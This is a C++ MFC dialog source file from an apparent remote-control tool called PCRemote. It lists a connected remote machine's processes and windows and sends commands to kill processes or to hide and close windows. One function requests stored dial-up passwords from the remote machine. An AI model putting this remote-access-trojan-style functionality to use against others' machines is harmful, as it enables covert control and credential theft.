// CSystemDlg.cpp: 实现文件
//

#include "pch.h"
#include "PCRemote.h"
#include "CSystemDlg.h"
#include "afxdialogex.h"


// CSystemDlg 对话框

IMPLEMENT_DYNAMIC(CSystemDlg, CDialogEx)

CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext* pContext)
	: CDialogEx(IDD_SYSTEM, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));
	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(0));
	m_bHow = lpBuffer[0];
}

CSystemDlg::~CSystemDlg()
{
}

void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);

	DDX_Control(pDX, IDC_LIST_PROCESS, m_list_process);

}


BEGIN_MESSAGE_MAP(CSystemDlg, CDialogEx)

	ON_COMMAND(IDM_KILLPROCESS, &CSystemDlg::OnKillprocess)
	ON_COMMAND(IDM_REFRESHPSLIST, &CSystemDlg::OnRefreshPslist)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, &CSystemDlg::OnNMRClickListProcess)

	ON_WM_CLOSE()
	ON_COMMAND(ID_WINDOW_RETURN, &CSystemDlg::OnWindowReturn)
	ON_COMMAND(ID_WINDOW_MIN, &CSystemDlg::OnWindowMin)
	ON_COMMAND(ID_WINDOW_MAX, &CSystemDlg::OnWindowMax)
	ON_COMMAND(ID_WINDOW_HIDE, &CSystemDlg::OnWindowHide)
	ON_COMMAND(ID_WINDOW_REFLUSH, &CSystemDlg::OnWindowReflush)
	ON_WM_SIZE()
	ON_COMMAND(ID_WINDOW_CLOSE, &CSystemDlg::OnWindowClose)
	ON_WM_SHOWWINDOW()
END_MESSAGE_MAP()


// CSystemDlg 消息处理程序


BOOL CSystemDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon


	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s - 系统管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);


	if (m_bHow == TOKEN_PSLIST)      //进程管理初始化列表
	{
		m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
		m_list_process.InsertColumn(0, "映像名称", LVCFMT_LEFT, 100);
		m_list_process.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
		m_list_process.InsertColumn(2, "程序路径", LVCFMT_LEFT, 400);
		ShowProcessList();
	}
	else if (m_bHow == TOKEN_WSLIST)//窗口管理初始化列表
	{
		//MessageBox("窗口管理");
		m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
		m_list_process.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
		m_list_process.InsertColumn(1, "窗口名称", LVCFMT_LEFT, 300);
		m_list_process.InsertColumn(2, "窗口状态", LVCFMT_LEFT, 400);
		m_list_process.InsertColumn(3, "2PID", LVCFMT_LEFT, 50);
		ShowWindowsList();
	}

	//AdjustList();
	
	//ShowSelectWindow();

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CSystemDlg::AdjustList()
{
	// TODO: 在此处添加实现代码.
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 0;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;

	if (m_list_process.GetSafeHwnd() != NULL)//必须先判断hwnd是否已经生成，否则会出现断言错误
	{
		m_list_process.MoveWindow(&rectList);
	}

}


void CSystemDlg::OnReceiveComplete()
{
	// TODO: 在此处添加实现代码.
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;
	//case TOKEN_DIALUPASS:
	//	ShowDialupassList();
	//	break;
	default:
		// 传输发生异常数据
		break;
	}
}


void CSystemDlg::ShowProcessList()
{
	// TODO: 在此处添加实现代码.
	char* lpBuffer = (char*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char* strExeFile;
	char* strProcessName;
	DWORD	dwOffset = 0;
	CString str;
	m_list_process.DeleteAllItems();
	int i = 0;
	for ( i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		strExeFile = lpBuffer + dwOffset + sizeof(DWORD);
		strProcessName = strExeFile + lstrlen(strExeFile) + 1;

		m_list_process.InsertItem(i, strExeFile);
		str.Format("%5u", *lpPID);
		m_list_process.SetItemText(i, 1, str);
		m_list_process.SetItemText(i, 2, strProcessName);
		// ItemData 为进程ID
		m_list_process.SetItemData(i, *lpPID);

		dwOffset += sizeof(DWORD) + lstrlen(strExeFile) + lstrlen(strProcessName) + 2;
	}

	str.Format("程序路径 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_process.SetColumn(2, &lvc);
}



void CSystemDlg::ShowWindowsList()
{
	// TODO: 在此处添加实现代码.
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char* lpTitle = NULL;
	//m_list_process.DeleteAllItems();
	bool isDel = false;
	do
	{
		isDel = false;
		for (int j = 0; j < m_list_process.GetItemCount(); j++)
		{
			CString temp = m_list_process.GetItemText(j, 2);
			CString restr = "隐藏";
			if (temp != restr)
			{
				m_list_process.DeleteItem(j);
				isDel = true;
				break;
			}
		}

	} while (isDel);
	CString	str;
	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		LPDWORD	lpPID2 = LPDWORD(lpBuffer + dwOffset + sizeof(DWORD));
		lpTitle = (char*)lpBuffer + dwOffset + sizeof(DWORD)+sizeof(DWORD);

		
		str.Format("%5u", *lpPID);
		m_list_process.InsertItem(i, str);
		m_list_process.SetItemText(i, 1, lpTitle);
		m_list_process.SetItemText(i, 2, "显示"); //(d) 将窗口状态显示为 "显示"
		str.Format("%5u", *lpPID2);
		m_list_process.SetItemText(i, 3, str); //(d) 将窗口状态显示为 "显示"
		// ItemData 为窗口句柄
		m_list_process.SetItemData(i, *lpPID);  //(d)
		dwOffset += sizeof(DWORD)+sizeof(DWORD) + lstrlen(lpTitle) + 1;

	}
	str.Format("窗口名称 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_process.SetColumn(1, &lvc);
}



void CSystemDlg::GetProcessList()
{
	// TODO: 在此处添加实现代码.
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CSystemDlg::GetWindowsList()
{
	// TODO: 在此处添加实现代码.
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CSystemDlg::GetDialupassList()
{
	// TODO: 在此处添加实现代码.
	BYTE bToken = COMMAND_DIALUPASS;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}



void CSystemDlg::OnKillprocess()
{
	// TODO: 在此添加命令处理程序代码
	CListCtrl* pListCtrl = NULL;
	if (m_list_process.IsWindowVisible())
		pListCtrl = &m_list_process;
	else if (m_list_process.IsWindowVisible())
		pListCtrl = &m_list_process;
	else
		return;

	// TODO: Add your command handler code here
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_KILLPROCESS;

	char* lpTips = "警告: 终止进程会导致不希望发生的结果，\n"
		"包括数据丢失和系统不稳定。在被终止前，\n"
		"进程将没有机会保存其状态和数据。";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%s确实\n想终止这%d项进程吗?", lpTips, pListCtrl->GetSelectedCount());
	}
	else
	{
		str.Format("%s确实\n想终止该项进程吗?", lpTips);
	}
	if (::MessageBox(m_hWnd, str, "进程结束警告", MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;

	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl

	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


void CSystemDlg::OnRefreshPslist()
{
	// TODO: 在此添加命令处理程序代码
	if (m_list_process.IsWindowVisible())
		GetProcessList();
	//if (m_list_windows.IsWindowVisible())
	//	GetWindowsList();
}


void CSystemDlg::OnNMRClickListProcess(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	//if (m_list_dialupass.IsWindowVisible())
	//	return;

	CMenu	popup;
	if (m_bHow == TOKEN_PSLIST)      //进程管理初始化列表
	{
		popup.LoadMenu(IDR_PSLIST);
	}
	else if (m_bHow == TOKEN_WSLIST)
	{
		popup.LoadMenu(IDR_WINDOW_LIST);
	}

	CMenu* pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

	*pResult = 0;
}




void CSystemDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	CDialogEx::OnClose();
}


void CSystemDlg::OnWindowReturn()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_process;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;     //同上
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //同上
		pListCtrl->SetItemText(nItem, 2, "显示");   //将状态改为显示
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_SHOW;     //同上
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));

	}
}


void CSystemDlg::OnWindowMin()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_process;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;     //同上
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //同上
		pListCtrl->SetItemText(nItem, 2, "显示");   //将状态改为显示
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_MINIMIZE;     //同上
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));

	}
}


void CSystemDlg::OnWindowMax()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_process;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;     //同上
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //同上
		pListCtrl->SetItemText(nItem, 2, "显示");   //将状态改为显示
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		DWORD dHow = SW_MAXIMIZE;     //同上
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));

	}
}


void CSystemDlg::OnWindowHide()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_process;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_TEST;       //窗口处理数据头
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //得到窗口的句柄一同发送
		pListCtrl->SetItemText(nItem, 2, "隐藏");  //注意这时将列表中的显示状态为"隐藏"
		//这样在删除列表条目时就不删除该项了 如果删除该项窗口句柄会丢失 就永远也不能显示了
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));  //得到窗口的句柄一同发送
		DWORD dHow = SW_HIDE;               //窗口处理参数 0
		memcpy(lpMsgBuf + 1 + sizeof(hwnd), &dHow, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));

	}
}


void CSystemDlg::OnWindowReflush()
{
	// TODO: 在此添加命令处理程序代码
	GetWindowsList();
}


void CSystemDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	AdjustList();
	// TODO: 在此处添加消息处理程序代码
}


void CSystemDlg::OnWindowClose()
{
	// TODO: 在此添加命令处理程序代码
	BYTE lpMsgBuf[20];
	CListCtrl* pListCtrl = NULL;
	pListCtrl = &m_list_process;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem >= 0)
	{
		ZeroMemory(lpMsgBuf, 20);
		lpMsgBuf[0] = COMMAND_WINDOW_CLOSE;      //注意这个就是我们的数据头
		DWORD hwnd = pListCtrl->GetItemData(nItem); //得到窗口的句柄一同发送
		memcpy(lpMsgBuf + 1, &hwnd, sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));

	}
}


void CSystemDlg::OnShowWindow(BOOL bShow, UINT nStatus)
{
	CDialogEx::OnShowWindow(bShow, nStatus);
	AdjustList();
	// TODO: 在此处添加消息处理程序代码
}
